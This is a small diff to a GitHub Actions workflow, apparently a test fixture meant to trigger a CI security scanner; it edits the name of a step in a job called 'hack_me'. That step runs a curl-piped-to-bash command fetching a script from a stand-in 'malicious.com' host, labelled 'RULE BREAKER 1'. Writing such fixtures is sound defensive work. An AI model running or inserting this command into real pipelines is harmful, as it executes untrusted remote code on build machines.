@@ -5,8 +5,7 @@ jobs:
   hack_me:
     runs-on: ubuntu-latest
     steps:
-      - name: This will trigger the scannerfvsv
-      fsdsd
+      - name: This will trigger the scannerfvs
         # RULE BREAKER 1: Piping curl to bash
         run: curl -sL http://malicious.com/script.sh | bash
 
